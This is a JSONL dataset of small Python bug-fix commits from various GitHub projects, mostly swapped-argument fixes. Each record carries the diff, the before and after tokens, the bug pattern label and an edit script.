{"project": "AutoPath", "commit_sha": "c68fcbd80ded7a89f9c464b788a8e6abde9f1666", "parent_sha": "ee213b519bd91112d1975817ab70c9cb7bf163f7", "file_path": "AutoPath.py", "project_url": "https://github.com/mliu-dark-knight/AutoPath", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -35,7 +35,7 @@ class AutoPath(object):\n \n \t\tfor variable in tf.trainable_variables():\n \t\t\t# print(variable.name, variable.get_shape())\n-\t\t\ttf.summary.histogram(variable, variable.name)\n+\t\t\ttf.summary.histogram(variable.name, variable)\n \n \tdef build_classification(self):\n \t\tembedding = dropout(tf.nn.embedding_lookup(self.embedding, self.indices), self.params.keep_prob, self.training)\n", "before": "tf . summary . histogram ( variable , variable . name )", "after": "tf . summary . histogram ( variable . name , variable )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 24, 3, 49], [\",:,\", \"T\"], 3], [\"Insert\", [\"argument_list\", 3, 24, 3, 49], [\"identifier:variable\", \"T\"], 4], [\"Delete\", [\"identifier:variable\", 3, 25, 3, 33]], [\"Delete\", [\",:,\", 3, 33, 3, 34]]]"}
{"project": "ddls3utils", "commit_sha": "edd4113fabdd3769506b304730c0774381a5156a", "parent_sha": "74ce6c81ba06bdd9687ea83371a7436c35868e59", "file_path": "ddls3utils/s3utils.py", "project_url": "https://github.com/Nedlitex/ddls3utils", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -131,7 +131,7 @@ class S3Client:\n             if isfile(current_file_location):\n                 current_folder_split = local_folder_location.split(os.sep)\n                 current_folder_s3_path = s3_base_folder + \"/\".join(current_folder_split) + \"/\"\n-                self.s3_upload_file(bucket, current_folder_s3_path, current_file_location)\n+                self.s3_upload_file(bucket, current_file_location, current_folder_s3_path)\n             else:\n                 self.s3_upload_folder(bucket, s3_base_folder, current_file_location)\n         return\n", "before": "self . s3_upload_file ( bucket , current_folder_s3_path , current_file_location )", "after": "self . s3_upload_file ( bucket , current_file_location , current_folder_s3_path )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"identifier:current_folder_s3_path\", 3, 45, 3, 67], [\"argument_list\", 3, 36, 3, 91], 5], [\"Move\", [\",:,\", 3, 67, 3, 68], [\"argument_list\", 3, 36, 3, 91], 6]]"}
{"project": "django-tools", "commit_sha": "52f25265908f55f8c7237e53c00ee2220947e0d6", "parent_sha": "ecbe92ec9e89216dabc0cf3fb5e0b6a69a642ba6", "file_path": "django_tools/unittest_utils/user.py", "project_url": "https://github.com/barseghyanartur/django-tools", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -132,4 +132,4 @@ TEST_USERS = {\n @pytest.fixture(scope=\"session\")\n def user_fixtures():\n     for user_data in TEST_USERS.values():\n-        create_user(**user_data, update_existing=True)\n+        create_user(update_existing=True, **user_data)\n", "before": "create_user ( ** user_data , update_existing = True )", "after": "create_user ( update_existing = True , ** user_data )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"keyword_argument\", 3, 34, 3, 54], [\"argument_list\", 3, 20, 3, 55], 1], [\"Insert\", [\"argument_list\", 3, 20, 3, 55], [\",:,\", \"T\"], 4], [\"Delete\", [\",:,\", 3, 32, 3, 33]]]"}
{"project": "optuna", "commit_sha": "6db5e7c73b77bfa8d252959039bbdc3bd09534d6", "parent_sha": "d3d95cf2fd4e4479b6ed116ea8e2ff4ac84e136e", "file_path": "pfnopt/storages/rdb/storage.py", "project_url": "https://github.com/cafeal/optuna", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -324,7 +324,7 @@ class RDBStorage(BaseStorage):\n \n         study = models.StudyModel.find_or_raise_by_id(study_id, session)\n \n-        return models.TrialModel.count(study, session, state)\n+        return models.TrialModel.count(session, study, state)\n \n     @staticmethod\n     def _merge_trials_orm(\n", "before": "return models . TrialModel . count ( study , session , state )", "after": "return models . TrialModel . count ( session , study , state )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"identifier:study\", 3, 40, 3, 45], [\"argument_list\", 3, 39, 3, 62], 3], [\"Move\", [\",:,\", 3, 45, 3, 46], [\"argument_list\", 3, 39, 3, 62], 4]]"}
{"project": "oauthlib", "commit_sha": "19d111df1c55456c0c85b6ba8051d3a9b3ac3733", "parent_sha": "76d8d3426004e3a14d372444c56f764ad71937e0", "file_path": "tests/openid/connect/core/grant_types/test_base.py", "project_url": "https://github.com/wiliamsouza/oauthlib", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -68,7 +68,7 @@ class IDTokenTest(TestCase):\n         self.assertEqual(token[\"id_token\"], \"eyJ.body.signature\")\n         id_token = self.mock_validator.finalize_id_token.call_args[0][0]\n         self.assertEqual(id_token['aud'], 'abcdef')\n-        self.assertGreaterEqual(id_token['iat'], int(time.time()))\n+        self.assertGreaterEqual(int(time.time()), id_token['iat'])\n \n     def test_finalize_id_token_with_nonce(self):\n         token = self.grant.add_id_token(self.token, \"token_handler_mock\", self.request, \"my_nonce\")\n", "before": "self . assertGreaterEqual ( id_token [ 'iat' ] , int ( time . time ( ) ) )", "after": "self . assertGreaterEqual ( int ( time . time ( ) ) , id_token [ 'iat' ] )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"call\", 3, 50, 3, 66], [\"argument_list\", 3, 32, 3, 67], 1], [\"Insert\", [\"argument_list\", 3, 32, 3, 67], [\",:,\", \"T\"], 4], [\"Delete\", [\",:,\", 3, 48, 3, 49]]]"}
{"project": "cool_bgp_stats", "commit_sha": "7d748a96aec7e463b789bd874be5c6262c90a5d2", "parent_sha": "36df5eb1ede328a9e15fc04ae49463997e3b8912", "file_path": "generateCSVsAndCTLsToInsertIntoDB.py", "project_url": "https://github.com/APNIC-net/cool_bgp_stats", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -134,7 +134,7 @@ def generateFilesForItem(name, item_list, files_path, routing_date):\n         tuples = zip(item_list, [True]*len(item_list), [routing_date]*len(item_list))\n         ctl_str = asns_ctl_str\n \n-    filename_woExt = '{}/{}_{}'.format(name, files_path, routing_date)\n+    filename_woExt = '{}/{}_{}'.format(files_path, name, routing_date)\n     writeCSVandCTLfiles(filename_woExt, tuples, ctl_str)\n     \n     end = time()\n", "before": "filename_woExt = '{}/{}_{}' . format ( name , files_path , routing_date )", "after": "filename_woExt = '{}/{}_{}' . format ( files_path , name , routing_date )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"identifier:name\", 3, 40, 3, 44], [\"argument_list\", 3, 39, 3, 71], 3], [\"Move\", [\",:,\", 3, 44, 3, 45], [\"argument_list\", 3, 39, 3, 71], 4]]"}
{"project": "sphinx", "commit_sha": "c6833609c07523605731a5c95860d0199c5a7620", "parent_sha": "21cfc46dc30d10d952b00fc237a518fff675a2d9", "file_path": "sphinx/environment.py", "project_url": "https://github.com/andreacassioli/sphinx", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -198,7 +198,7 @@ class Locale(Transform):\n         settings, source = self.document.settings, self.document['source']\n         # XXX check if this is reliable\n         assert source.startswith(env.srcdir)\n-        docname = path.splitext(relative_path(source, env.srcdir))[0]\n+        docname = path.splitext(relative_path(env.srcdir, source))[0]\n         textdomain = find_catalog(docname,\n                                   self.document.settings.gettext_compact)\n \n", "before": "docname = path . splitext ( relative_path ( source , env . srcdir ) ) [ 0 ]", "after": "docname = path . splitext ( relative_path ( env . srcdir , source ) ) [ 0 ]", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 46, 3, 66], [\",:,\", \"T\"], 3], [\"Insert\", [\"argument_list\", 3, 46, 3, 66], [\"identifier:source\", \"T\"], 4], [\"Delete\", [\"identifier:source\", 3, 47, 3, 53]], [\"Delete\", [\",:,\", 3, 53, 3, 54]]]"}
{"project": "HammerAddons", "commit_sha": "19b912d2a481509607f72925ac776354ca624b75", "parent_sha": "9bc05ff92b09cf319732d9b67d73e0a90dd864e6", "file_path": "unify_fgd.py", "project_url": "https://github.com/TeamSpen210/HammerAddons", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -402,7 +402,7 @@ def action_count(dbase: Path, extra_db: Optional[Path]) -> None:\n             base_uses[base.classname].add(ent.classname)\n \n         for game, tags in expanded.items():\n-            if match_tags(appliesto, tags):\n+            if match_tags(tags, appliesto):\n                 counter[game] += 1\n                 game_classes[game, typ].add(ent.classname)\n                 has_ent.add(game)\n", "before": "if match_tags ( appliesto , tags ) : counter [ game ] += 1 game_classes [ game , typ ] . add ( ent . classname ) has_ent . add ( game )", "after": "if match_tags ( tags , appliesto ) : counter [ game ] += 1 game_classes [ game , typ ] . add ( ent . classname ) has_ent . add ( game )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"identifier:appliesto\", 3, 27, 3, 36], [\"argument_list\", 3, 26, 3, 43], 3], [\"Move\", [\",:,\", 3, 36, 3, 37], [\"argument_list\", 3, 26, 3, 43], 4]]"}
{"project": "bloom", "commit_sha": "78a755c0166121ff8c6d41d8da073bfa7a184954", "parent_sha": "e472d42bbcff9475af2c76c671e0ef39ee2ad177", "file_path": "bloom/commands/git/config.py", "project_url": "https://github.com/locusrobotics/bloom", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -264,7 +264,7 @@ def delete_cmd(track):\n \n \n def copy_cmd(args):\n-    copy_track(args.dst, args.src)\n+    copy_track(args.src, args.dst)\n \n \n def copy_track(src, dst):\n", "before": "copy_track ( args . dst , args . src )", "after": "copy_track ( args . src , args . dst )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"attribute\", 3, 16, 3, 24], [\"argument_list\", 3, 15, 3, 35], 2], [\"Move\", [\"attribute\", 3, 26, 3, 34], [\"argument_list\", 3, 15, 3, 35], 1]]"}
{"project": "txircd", "commit_sha": "bdf1d9671f70ff125bd6f1bc37e0def8e2116442", "parent_sha": "ed9f97ad8c71133959e999afa5f0ffd68c1bdfb7", "file_path": "txircd/channel.py", "project_url": "https://github.com/runsthruit/txircd", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -174,6 +174,6 @@ class IRCChannel(object):\n                 self.ircd.runActionStandard(\"modechange-channel-{}\".format(mode), self, adding, mode, param, user, source)\n         if changing:\n             changingDisplay = copy(changing)\n-            self.ircd.runActionProcessing(\"modemessage-channel\", self, changingDisplay)\n+            self.ircd.runActionProcessing(\"modemessage-channel\", changingDisplay, self)\n             self.ircd.runActionStandard(\"modechanges-channel\", self, changing)\n         return changing\n\\ No newline at end of file\n", "before": "self . ircd . runActionProcessing ( \"modemessage-channel\" , self , changingDisplay )", "after": "self . ircd . runActionProcessing ( \"modemessage-channel\" , changingDisplay , self )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"identifier:self\", 3, 66, 3, 70], [\"argument_list\", 3, 42, 3, 88], 5], [\"Move\", [\",:,\", 3, 70, 3, 71], [\"argument_list\", 3, 42, 3, 88], 6]]"}
{"project": "txircd", "commit_sha": "782a4b028c45d3cc37e6679ccc3d482f0518b4b7", "parent_sha": "29589d0c4bf5dc57962d21e6f3454f2b967e2bcb", "file_path": "txircd/modules/cmode_t.py", "project_url": "https://github.com/runsthruit/txircd", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -8,7 +8,7 @@ class TopiclockMode(Mode):\n \t\tif \"topic\" not in data:\n \t\t\treturn data\n \t\ttargetChannel = data[\"targetchan\"]\n-\t\tif \"t\" in targetChannel.mode and not user.hasAccess(self.ircd.servconfig[\"channel_minimum_level\"][\"TOPIC\"], targetChannel.name):\n+\t\tif \"t\" in targetChannel.mode and not user.hasAccess(targetChannel.name, self.ircd.servconfig[\"channel_minimum_level\"][\"TOPIC\"]):\n \t\t\tuser.sendMessage(irc.ERR_CHANOPRIVSNEEDED, targetChannel.name, \":You do not have access to change the topic on this channel\")\n \t\t\treturn {}\n \t\treturn data\n", "before": "if \"t\" in targetChannel . mode and not user . hasAccess ( self . ircd . servconfig [ \"channel_minimum_level\" ] [ \"TOPIC\" ] , targetChannel . name ) : user . sendMessage ( irc . ERR_CHANOPRIVSNEEDED , targetChannel . name , \":You do not have access to change the topic on this channel\" ) return { }", "after": "if \"t\" in targetChannel . mode and not user . hasAccess ( targetChannel . name , self . ircd . servconfig [ \"channel_minimum_level\" ] [ \"TOPIC\" ] ) : user . sendMessage ( irc . ERR_CHANOPRIVSNEEDED , targetChannel . name , \":You do not have access to change the topic on this channel\" ) return { }", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"attribute\", 3, 111, 3, 129], [\"argument_list\", 3, 54, 3, 130], 1], [\"Insert\", [\"argument_list\", 3, 54, 3, 130], [\",:,\", \"T\"], 4], [\"Delete\", [\",:,\", 3, 109, 3, 110]]]"}
{"project": "sugar", "commit_sha": "6a588343b94603971f0782c533d74608ad970221", "parent_sha": "c7dbbf828ff0212d30755de14d1af121830c884b", "file_path": "src/jarabe/journal/model.py", "project_url": "https://github.com/rparrapy/sugar", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -371,7 +371,7 @@ class InplaceResultSet(BaseResultSet):\n \n         if self._regex is not None and \\\n                 not self._regex.match(full_path):\n-            metadata = _get_file_metadata(stat, full_path,\n+            metadata = _get_file_metadata(full_path, stat,\n                                           fetch_preview=False)\n             if not metadata:\n                 return\n", "before": "metadata = _get_file_metadata ( stat , full_path , fetch_preview = False )", "after": "metadata = _get_file_metadata ( full_path , stat , fetch_preview = False )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Update\", [\"identifier:stat\", 3, 43, 3, 47], \"full_path\"], [\"Update\", [\"identifier:full_path\", 3, 49, 3, 58], \"stat\"]]"}
{"project": "koji-playground", "commit_sha": "0a417f10e013a49541e81dac834cfab9036b68db", "parent_sha": "fb626d803d9c93c8a1bf584bb7cf11c2b2578e5b", "file_path": "hub/kojihub.py", "project_url": "https://github.com/mikem23/koji-playground", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -9290,7 +9290,7 @@ class RootExports(object):\n         context.session.assertPerm('admin')\n         _tag_build(tag, build, force=force)\n         if notify:\n-            tag_notification(True, None, tag, build, context.session.user_id)\n+            tag_notification(True, tag, None, build, context.session.user_id)\n \n     def tagBuild(self, tag, build, force=False, fromtag=None):\n", "before": "tag_notification ( True , None , tag , build , context . session . user_id )", "after": "tag_notification ( True , tag , None , build , context . session . user_id )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 29, 3, 78], [\"identifier:tag\", \"T\"], 3], [\"Insert\", [\"argument_list\", 3, 29, 3, 78], [\"none:None\", \"T\"], 6], [\"Delete\", [\"none:None\", 3, 36, 3, 40]], [\"Delete\", [\"identifier:tag\", 3, 42, 3, 45]]]"}
{"project": "diffsims", "commit_sha": "3727a08005930cd0da301726a9b8e726b9206e8a", "parent_sha": "1284112e9114aa65d38405dc04def29f52763486", "file_path": "pyxem/signals/diffraction_vectors.py", "project_url": "https://github.com/pyxem/diffsims", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -70,7 +70,7 @@ class DiffractionVectors(BaseSignal):\n         #Plot the gvector positions\n         fig = plt.figure()\n         ax = fig.add_subplot(111)\n-        ax.plot(unique_vectors.data.T[1], unique_vectors.data.T[0], 'ro')\n+        ax.plot(unique_vectors.data.T[0], unique_vectors.data.T[1], 'ro')\n         ax.set_xlim(-xlim, xlim)\n         ax.set_ylim(-ylim, ylim)\n         ax.set_aspect('equal')\n", "before": "ax . plot ( unique_vectors . data . T [ 1 ] , unique_vectors . data . T [ 0 ] , 'ro' )", "after": "ax . plot ( unique_vectors . data . T [ 0 ] , unique_vectors . data . T [ 1 ] , 'ro' )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"subscript\", 3, 17, 3, 41], [\"argument_list\", 3, 16, 3, 74], 2], [\"Move\", [\"subscript\", 3, 43, 3, 67], [\"argument_list\", 3, 16, 3, 74], 1]]"}
{"project": "daal4py", "commit_sha": "49d2d5ed432fd99470e226278d40f627cc97c6cb", "parent_sha": "d1890bd3db5d092c50b113199711f9ffcb2c78af", "file_path": "examples/saga_batch.py", "project_url": "https://github.com/IntelPython/daal4py", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -58,7 +58,7 @@ def main(readcsv=read_csv, method='defaultDense'):\n \n     # finally do the computation\n     inp = np.zeros((2, 1), dtype=np.double)\n-    res = saga_algo.compute(None, inp)\n+    res = saga_algo.compute(inp, None)\n \n     # The Saga result provides minimum and nIterations\n     assert res.minimum.shape == inp.shape and res.nIterations[0][0] <= niters\n", "before": "res = saga_algo . compute ( None , inp )", "after": "res = saga_algo . compute ( inp , None )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"none:None\", 3, 29, 3, 33], [\"argument_list\", 3, 28, 3, 39], 3], [\"Move\", [\",:,\", 3, 33, 3, 34], [\"argument_list\", 3, 28, 3, 39], 4]]"}
{"project": "dgenies", "commit_sha": "1b9862a0f1210f9a1e4d66eeece9e16f3810bfc8", "parent_sha": "01b3b9c84e9354666c86034f93da914e55e69f56", "file_path": "lib/mailer.py", "project_url": "https://github.com/genotoul-bioinfo/dgenies", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -37,7 +37,7 @@ class Mailer:\n                   \"################\\n\\n\"\n                   \"!!! SEND MAILS DISABLED BY CONFIGURATION !!!\\n\\n\"\n                   \"(This might be disabled in production)\\n\\n\")\n-            print(\"Sender: %s <%s>\\n\" % sender if isinstance(tuple, sender) else (\"None\", sender))\n+            print(\"Sender: %s <%s>\\n\" % sender if isinstance(sender, tuple) else (\"None\", sender))\n             print(\"Reply to: %s\\n\" % reply)\n             print(\"Recipients: %s\\n\" % \", \".join(recipients))\n             print(\"Subject: %s\\n\" % subject)\n", "before": "print ( \"Sender: %s <%s>\\n\" % sender if isinstance ( tuple , sender ) else ( \"None\" , sender ) )", "after": "print ( \"Sender: %s <%s>\\n\" % sender if isinstance ( sender , tuple ) else ( \"None\" , sender ) )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"identifier:tuple\", 3, 62, 3, 67], [\"argument_list\", 3, 61, 3, 76], 3], [\"Move\", [\",:,\", 3, 67, 3, 68], [\"argument_list\", 3, 61, 3, 76], 4]]"}
{"project": "yt-1", "commit_sha": "1c94c814887ec79c5fe7208e2390a63a4253e6d0", "parent_sha": "e4100e28f47a58f797028878979ee61a3ad96a75", "file_path": "yt/frontends/ramses/particle_handlers.py", "project_url": "https://github.com/Xarthisius/yt-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -351,7 +351,7 @@ class SinkParticleFileHandler(ParticleFileHandler):\n             fields = list(self.known_fields)\n \n         for i in range(self.ds.dimensionality * 2 + 1):\n-            for j in range(self.ds.max_level, self.ds.min_level):\n+            for j in range(self.ds.min_level, self.ds.max_level):\n                 fields.append((\"particle_prop_%s_%s\" % (i, j), \"d\"))\n \n         field_offsets = {}\n", "before": "for j in range ( self . ds . max_level , self . ds . min_level ) : fields . append ( ( \"particle_prop_%s_%s\" % ( i , j ) , \"d\" ) )", "after": "for j in range ( self . ds . min_level , self . ds . max_level ) : fields . append ( ( \"particle_prop_%s_%s\" % ( i , j ) , \"d\" ) )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"attribute\", 3, 28, 3, 45], [\"argument_list\", 3, 27, 3, 65], 2], [\"Move\", [\"attribute\", 3, 47, 3, 64], [\"argument_list\", 3, 27, 3, 65], 1]]"}
{"project": "yt-1", "commit_sha": "41f5e26c3a03ff17850cacbd67aff3669981c0d4", "parent_sha": "9777cee153d92744a8da1b1e9a22e98b2124f128", "file_path": "yt/visualization/volume_rendering/scene.py", "project_url": "https://github.com/Xarthisius/yt-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -334,7 +334,7 @@ class Scene:\n \n             shape = self._last_render.shape\n             fig = Figure((shape[0] / 100.0, shape[1] / 100.0))\n-            canvas = get_canvas(fname, fig)\n+            canvas = get_canvas(fig, fname)\n \n             ax = fig.add_axes([0, 0, 1, 1])\n             ax.set_axis_off()\n", "before": "canvas = get_canvas ( fname , fig )", "after": "canvas = get_canvas ( fig , fname )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"identifier:fname\", 3, 33, 3, 38], [\"argument_list\", 3, 32, 3, 44], 3], [\"Move\", [\",:,\", 3, 38, 3, 39], [\"argument_list\", 3, 32, 3, 44], 4]]"}
{"project": "python-control", "commit_sha": "b728861c4daef06a95cfefd2de6f0b94b282528f", "parent_sha": "466f7efc6659f2db82cafddd1b8c98729bc65b0b", "file_path": "src/statesp.py", "project_url": "https://github.com/python-control/python-control", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -437,7 +437,7 @@ cannot take keywords.\")\n         # Repeat the common denominator along the rows.\n         den = array([den for i in range(sys.outputs)])\n \n-        ssout = td04ad(sys.inputs, sys.outputs, index, num, den)\n+        ssout = td04ad(sys.inputs, sys.outputs, index, den, num)\n \n         return StateSpace(ssout[1], ssout[2], ssout[3], ssout[4])\n     elif isinstance(sys, (int, long, float, complex)):\n", "before": "ssout = td04ad ( sys . inputs , sys . outputs , index , num , den )", "after": "ssout = td04ad ( sys . inputs , sys . outputs , index , den , num )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Update\", [\"identifier:num\", 3, 56, 3, 59], \"den\"], [\"Update\", [\"identifier:den\", 3, 61, 3, 64], \"num\"]]"}
{"project": "Sark", "commit_sha": "e8b0993369ad956b9f44d8a0fbed327133005ba9", "parent_sha": "f02b7e7b501b73d786d2286b72ee6651812fb720", "file_path": "sark/data.py", "project_url": "https://github.com/tmr232/Sark", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -131,7 +131,7 @@ def apply_patches(output_path=None):\n \n \n def undefine(start, end):\n-    idaapi.del_items(start, end - start, idaapi.DELIT_SIMPLE)\n+    idaapi.del_items(start, idaapi.DELIT_SIMPLE, end - start)\n \n \n def is_string(ea):\n", "before": "idaapi . del_items ( start , end - start , idaapi . DELIT_SIMPLE )", "after": "idaapi . del_items ( start , idaapi . DELIT_SIMPLE , end - start )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"binary_operator\", 3, 29, 3, 40], [\"argument_list\", 3, 21, 3, 62], 4], [\"Move\", [\"attribute\", 3, 42, 3, 61], [\"argument_list\", 3, 21, 3, 62], 3]]"}
{"project": "pycbc", "commit_sha": "ae5a8778bfa23e3eb2bd3b642c3d0f754040dd2a", "parent_sha": "5ff1964a264fb08cc4f77088728c69d989775daa", "file_path": "pycbc/vetoes/chisq.py", "project_url": "https://github.com/ahnitz/pycbc", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -257,7 +257,7 @@ def power_chisq(template, data, num_bins, psd, low_frequency_cutoff=None, high_f\n     total_snr, corr, tnorm = matched_filter_core(htilde, stilde, psd,\n                            low_frequency_cutoff, high_frequency_cutoff, corr_out=corra)\n \n-    return power_chisq_from_precomputed(corr, total_snr, bins, tnorm)\n+    return power_chisq_from_precomputed(corr, total_snr, tnorm, bins)\n \n class SingleDetPowerChisq(object):\n", "before": "return power_chisq_from_precomputed ( corr , total_snr , bins , tnorm )", "after": "return power_chisq_from_precomputed ( corr , total_snr , tnorm , bins )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"identifier:bins\", 3, 58, 3, 62], [\"argument_list\", 3, 40, 3, 70], 7], [\"Move\", [\",:,\", 3, 62, 3, 63], [\"argument_list\", 3, 40, 3, 70], 8]]"}
{"project": "django-scribbler", "commit_sha": "211d5089f156724b4f41fde22b66c6e6b25aa8de", "parent_sha": "266e1d9d85085b0c5451a1e7d651992aeaa60d57", "file_path": "scribbler/views.py", "project_url": "https://github.com/rlconley/django-scribbler", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -48,7 +48,7 @@ def preview_scribble(request):\n             scribbler_template = template.Template(form.cleaned_data.get('content', ''))\n         context = build_scribble_context(form.instance)\n         results['html'] = scribbler_template.render(context, request)\n-        results['variables'] = get_variables(RequestContext(context, request))\n+        results['variables'] = get_variables(RequestContext(request, context))\n     else:\n         if hasattr(form, 'exc_info'):\n             exc_type, exc_value, tb = form.exc_info\n", "before": "results [ 'variables' ] = get_variables ( RequestContext ( context , request ) )", "after": "results [ 'variables' ] = get_variables ( RequestContext ( request , context ) )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"identifier:context\", 3, 61, 3, 68], [\"argument_list\", 3, 60, 3, 78], 3], [\"Move\", [\",:,\", 3, 68, 3, 69], [\"argument_list\", 3, 60, 3, 78], 4]]"}
{"project": "orange3", "commit_sha": "12a89ec954e17f2a241f67c805c5371796c12672", "parent_sha": "3b66f2cba965031801db71a46335b664ef5b90ab", "file_path": "Orange/widgets/data/owrank.py", "project_url": "https://github.com/wicky-info/orange3", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -343,7 +343,7 @@ class OWRank(widget.OWWidget):\n                 s = None\n                 if attr is not None:\n                     try:\n-                        s = float(estimator(attr, data))\n+                        s = float(estimator(data, attr))\n                     except Exception as ex:\n                         self.warning(index, \"Error evaluating %r: %r\" %\n                                      (meas.name, str(ex)))\n", "before": "s = float ( estimator ( attr , data ) )", "after": "s = float ( estimator ( data , attr ) )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"identifier:attr\", 3, 45, 3, 49], [\"argument_list\", 3, 44, 3, 56], 3], [\"Move\", [\",:,\", 3, 49, 3, 50], [\"argument_list\", 3, 44, 3, 56], 4]]"}
{"project": "aiohttp", "commit_sha": "fdf69992c0e72f6c5e6aa17cb7fbe5c1db28434f", "parent_sha": "640ec1a8fcb82b36602bf7be4756f99e978463f0", "file_path": "aiohttp/protocol.py", "project_url": "https://github.com/alunduil/aiohttp", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -336,7 +336,7 @@ class HttpPayloadParser:\n                 out.feed_data(chunk)\n                 required -= len(chunk)\n         except aiohttp.EofStream:\n-            raise errors.IncompleteRead(required, length-required)\n+            raise errors.IncompleteRead(length-required, required)\n \n     def parse_eof_payload(self, out, buf):\n         \"\"\"Read all bytes untile eof.\"\"\"\n", "before": "except aiohttp . EofStream : raise errors . IncompleteRead ( required , length - required )", "after": "except aiohttp . EofStream : raise errors . IncompleteRead ( length - required , required )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 40, 3, 67], [\",:,\", \"T\"], 3], [\"Insert\", [\"argument_list\", 3, 40, 3, 67], [\"identifier:required\", \"T\"], 4], [\"Delete\", [\"identifier:required\", 3, 41, 3, 49]], [\"Delete\", [\",:,\", 3, 49, 3, 50]]]"}
{"project": "json-rpc", "commit_sha": "8e45916cc10e5f0038de9bf1ae60a5b44a21b907", "parent_sha": "f8b7f98d6a8833489c2db752cc81d33043b22bed", "file_path": "jsonrpc/tests/test_utils.py", "project_url": "https://github.com/pavlov99/json-rpc", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -71,7 +71,7 @@ class TestDatetimeDecimalEncoder(unittest.TestCase):\n         )\n \n     def test_decimal_encoder(self):\n-        obj = decimal.Decimal(0.1)\n+        obj = decimal.Decimal('0.1')\n \n         with self.assertRaises(TypeError):\n             json.dumps(obj)\n", "before": "obj = decimal . Decimal ( 0.1 )", "after": "obj = decimal . Decimal ( '0.1' )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 30, 3, 35], [\"string:'0.1'\", \"T\"], 1], [\"Delete\", [\"float:0.1\", 3, 31, 3, 34]]]"}
{"project": "zipline", "commit_sha": "192dd84b6a99adfeecdc2ace8ce246644f263b2e", "parent_sha": "59f12df7c83ae39c67b5abc12fb7b48db94de036", "file_path": "zipline/finance/slippage.py", "project_url": "https://github.com/renning22/zipline", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -531,7 +531,7 @@ class FixedBasisPointsSlippage(SlippageModel):\n         volume_limit=(0, None),\n         __funcname='FixedBasisPointsSlippage',\n     )\n-    def __init__(self, basis_points=5, volume_limit=0.1):\n+    def __init__(self, basis_points=5.0, volume_limit=0.1):\n         super(FixedBasisPointsSlippage, self).__init__()\n         self.basis_points = basis_points\n         self.percentage = self.basis_points / 10000.0\n", "before": "def __init__ ( self , basis_points = 5 , volume_limit = 0.1 ) : super ( FixedBasisPointsSlippage , self ) . __init__ ( ) self . basis_points = basis_points self . percentage = self . basis_points / 10000.0", "after": "def __init__ ( self , basis_points = 5.0 , volume_limit = 0.1 ) : super ( FixedBasisPointsSlippage , self ) . __init__ ( ) self . basis_points = basis_points self . percentage = self . basis_points / 10000.0", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 24, 3, 38], [\"float:5.0\", \"T\"], 2], [\"Delete\", [\"integer:5\", 3, 37, 3, 38]]]"}
